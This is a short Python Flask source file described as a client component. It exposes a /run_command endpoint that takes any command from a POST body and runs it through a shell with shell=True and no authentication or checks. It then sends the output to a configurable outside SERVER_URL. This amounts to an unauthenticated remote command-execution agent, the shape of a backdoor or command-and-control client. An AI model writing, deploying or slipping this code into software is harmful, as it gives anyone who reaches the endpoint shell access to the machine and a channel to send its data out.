## client component that can receive commands from the server and execute them.

"""Client component that executes commands from the server."""

import os
import subprocess

from flask import Flask, request
import requests

SERVER_URL = os.getenv('SERVER_URL', 'http://server_url')

app = Flask(__name__)

@app.route('/run_command', methods=['POST'])
def run_command():
    # Extract the command from the JSON payload
    command = request.json['command']

    # Execute the command using subprocess
    try:
        output = subprocess.check_output(command, shell=True, text=True)
    except subprocess.CalledProcessError as err:
        output = err.output

    # Send the output back to the server using an HTTP POST request
    requests.post(f"{SERVER_URL}/command_output", json={'output': output})

    return 'Command executed successfully'
